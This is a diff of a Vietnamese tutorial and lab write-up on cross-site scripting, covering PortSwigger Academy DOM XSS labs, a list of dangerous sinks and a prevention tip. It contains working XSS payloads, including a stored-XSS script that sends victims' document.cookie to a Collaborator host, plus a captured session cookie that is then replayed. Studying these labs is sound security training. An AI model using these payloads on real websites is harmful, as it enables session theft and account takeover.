@@ -1,4 +1,4 @@
-Tìm hiểu Cross-site scripting (XSS)
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c90822f2-bc18-4341-8596-ea9aa4267f20" />Tìm hiểu Cross-site scripting (XSS)
 A.	LÝ THUYẾT
 1.	Khái niệm và mục đích:
 -	Khái niệm: Cross-site scripting (XSS) là lỗ hổng bảo mật web cho phép kẻ tấn công chèn và thực thi mã độc (thường là JavaScript) vào trình duyệt của người dùng thông qua một ứng dụng web dễ bị tấn công.
@@ -256,17 +256,87 @@ Bước 2:Thay đổi URL để bao gồm tải trọng XSS phù hợp bên tron
   product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9a6cbe0e-ad52-4b93-8586-6f509653f40c" />
 Vì dữ liệu từ storeId được chèn trực tiếp vào HTML bằng document.write(), nên nếu kẻ tấn công cung cấp một giá trị độc hại trong tham số storeId, trình duyệt sẽ phân tích và hiển thị nó như mã HTML hoặc JavaScript hợp lệ.
-
-
-
-
-
-
-
-
-
-
-
+3.3.3 DOM XSS trong innerHTML sử dụng nguồn location.search
+Lab này tồn tại lỗ hổng XSS (Cross-site Scripting) dựa trên DOM trong chức năng tìm kiếm của blog. Ứng dụng sử dụng gán innerHTML để hiển thị nội dung vào một thẻ div, lấy dữ liệu trực tiếp từ location.search.
+Bước 1: Nhập tìm kiếm <img src=1 onerror=alert(1)> 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4bb2de13-b5e7-4727-8ebb-6e7cec2a92cb" />
+Giá trị của src không hợp lệ và trả về lỗi. Điều này kích hoạt trình xử lý sự kiện onerror, sau đó gọi alert(). Kết quả là, payload được thực thi bất cứ khi nào trình duyệt của người dùng cố gắng tải trang chứa bài đăng độc hại.
+3.3.4 DOM XSS trong jQuery với điểm đích là thuộc tính href sử dụng dữ liệu từ location.search 
+Lab này có lỗ hổng XSS dựa trên DOM trong trang gửi phản hồi. Ứng dụng sử dụng hàm selector $ của jQuery để tìm thẻ liên kết (<a>) và gán giá trị cho thuộc tính href của thẻ này bằng dữ liệu lấy từ location.search. Bằng cách tạo một đoạn mã gây hiển thị cảnh báo (alert) chứa giá trị document.cookie thông qua liên kết "back".
+Bước 1: Trên trang feedback thay đổi truy vấn returnPath thành /mytien1234
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6986487b-d48b-403f-9891-93e87395e155" />
+Quan sát chuỗi mytien1234 đã được đặt bên trong href thuộc tính a.
+Bước 2: Thay đổi returnPath thành javascript:alert(document.cookie) rồi nhấn back
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8816f985-c0b1-434a-9f94-3261a166d032" />
+- Trên trang "feedback", tham số returnPath từ URL được đưa thẳng vào thuộc tính href của liên kết "back".
+      + Nếu ta nhập chuỗi ngẫu nhiên, chuỗi đó sẽ xuất hiện nguyên văn trong href.
+      + Nếu ta thay bằng javascript:alert(document.cookie), khi bấm vào liên kết, trình duyệt thực thi đoạn JavaScript này → hiện hộp thoại chứa cookie
+3.3.5 DOM XSS trong jQuery, với điểm đích là hàm chọn phần tử (selector), khai thác thông qua hashchange.
+Lab này có lỗ hổng XSS dựa trên DOM trên trang chủ. Ứng dụng sử dụng hàm selector $() của jQuery để tự động cuộn tới một bài viết cụ thể, trong đó tiêu đề bài viết được lấy trực tiếp từ thuộc tính location.hash. Bằng cách tạo payload khiến nạn nhân khi truy cập sẽ thực thi hàm print() trong trình duyệt.
+Bước 1: Mở the exploit server, thêm vào phần Body 
+iframe:
+<iframe src="https://0a6c006603f56be78071e4ad001a0049.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/97271563-5080-4a16-b391-5d86893a473b" />
+Bước 2:Nhấn Store the exploit ->View exploit  để xác nhận rằng print() được gọi-> Deliver to victim 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3fc01c97-f9b0-4599-a978-1c977b3406db" />
+Payload hoạt động vì ứng dụng lấy hash từ URL và đưa thẳng vào jQuery selector, nên khi hash chứa mã độc được chèn qua iframe, nó dẫn đến thực thi JavaScript (DOM XSS).
+3.3.6 DOM XSS trong biểu thức AngularJS, với dấu ngoặc nhọn và dấu ngoặc kép đã được mã hóa HTML
+Lab này chứa lỗ hổng thực thi mã lệnh chéo trang dựa trên DOM trong biểu thức AngularJS trong chức năng tìm kiếm.
+AngularJS là một thư viện JavaScript phổ biến, quét nội dung của các nút HTML chứa thuộc ng-apptính (còn được gọi là chỉ thị AngularJS). Khi một chỉ thị được thêm vào mã HTML, ta có thể thực thi các biểu thức JavaScript trong cặp dấu ngoặc nhọn. 
+Bước 1: Nhập tìm kiếm chuỗi mytien1234.Quan sát thấy chuỗi đó được bao gồm trong một ng-app
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/05f62b54-cae1-4c1f-bee0-5906abdd8b2a" />
+Bước 2: Nhập {{$on.constructor('alert(1)')()}} vào tìm kiếm
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/55b63e5f-ba82-4087-97da-9fb8b119b925" />
+Do dữ liệu từ hộp tìm kiếm được chèn thẳng vào ng-app directive, attacker có thể đưa vào một biểu thức AngularJS tùy ý, khiến ứng dụng thực thi JavaScript độc hại.
+3.3.7 Reflected DOM XSS
+Bài thực hành này mô tả lỗ hổng Reflected DOM XSS, khi dữ liệu từ yêu cầu được phản hồi lại và script trên trang xử lý không an toàn, đưa vào một vùng nhớ nguy hiểm.
+Bước 1: Tìm kiếm XSS trong tab Intercept chuỗi XSS trong phản hồi JSON có tên là search-results
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/30732b76-d648-449d-bdb5-dda6b366d7fa" />
+Bước 2: Mở Site Map, để mở searchResults.js. Quan sát thấy phản hồi được sử dụng bằng lệnh gọi eval()
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2107aa7f-0af7-4d5c-a32c-d904445224c8" />
+Bước 3: Nhập \"-alert(1)}// vào ô tìm kiếm:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7bdd4580-c8a3-4c3d-b0d2-a87ebfb622c1" />
+Payload thành công vì lợi dụng việc eval() xử lý JSON, kết hợp kỹ thuật thoát chuỗi bằng backslash chưa được lọc, cho phép chèn JavaScript trực tiếp.
+3.3.8 Stored DOM XSS
+Bước 1:  Đăng bình luận có chứa vector: <><img src=1 onerror=alert(1)>
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ddfb424f-e5a1-43b3-8b42-5d876f54eaee" />
+Website dùng replace() để lọc < >, nhưng chỉ thay lần đầu.Trong payload cặp < > đầu bị lọc, nhưng <img ...> phía sau vẫn chèn vào DOM. Kết quả: ảnh lỗi → onerror=alert(1) chạy → popup hiện ra.
+3.3.9 Những sink dẫn đến DOM XSS
+- Nguyên nhân chính:
+      + document.write()                       + element.outerHTML
+      + element.insertAdjacentHTML             + document.writeln()
+      + document.domain                        + element.innerHTML
+      + element.onevent
+- Các hàm jQuery:
+      + add()                  + wrap()
+      + after()                + wrapInner()
+      + append()               + wrapAll()
+      + animate()              + has()
+      + insertAfter()          + constructor()
+      + insertBefore()         + init()
+      + before()               + index()
+      + html()                 + jQuery.parseHTML()
+      + prepend()              + $.parseHTML()
+      + replaceAll()           ++ replaceWith()  
+3.3.10 Cách ngăn chặn DOM XSS: Không cho phép dữ liệu từ bất kỳ nguồn không đáng tin cậy nào được ghi động vào tài liệu HTML.
+4. Khai thác lỗ hổng cross-site scripting
+4.1 Khai thác tấn công cross-site scripting để đánh cắp cookie
+Lab này chứa một lỗ hổng XSS được lưu trữ trong chức năng bình luận của blog. Người dùng giả lập sẽ xem tất cả bình luận sau khi chúng được đăng. Để giải quyết bài thực hành, hãy khai thác lỗ hổng để đánh cắp cookie phiên của nạn nhân, sau đó sử dụng cookie này để mạo danh nạn nhân.
+Bước 1: Chuyển đến tab the Collaborator, nhấn vào Copy to clipboard
+Bước 2: Gửi nội dung sau vào blog:
+<script>
+fetch('https://1kmlk85vcr4wxtot3mjir0sxdojf7kv9.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+Tập lệnh này sẽ gửi yêu cầu POST chứa cookie của bất kỳ ai xem bình luận đến tên miền phụ của bạn trên máy chủ Collaborator công khai.
+Bước 3: Quay lại Collaborator. Ghi lại giá trị cookie của nạn nhân trong nội dung POST.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7d32d32d-eccf-4c31-bfe4-576155ef7714" />
+giá trị cookie: 3XsEYKip1OGABghv3wdMZRm1y0fT5a0H
+Bước 4: Tải lại trang blog chính, sử dụng Burp Repeater để thay thế cookie phiên của ta bằng cookie ta đã ghi lại trong Burp Collaborator. 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13dda52b-e65f-4e72-9382-55d6d703bd34" />
 
 
 
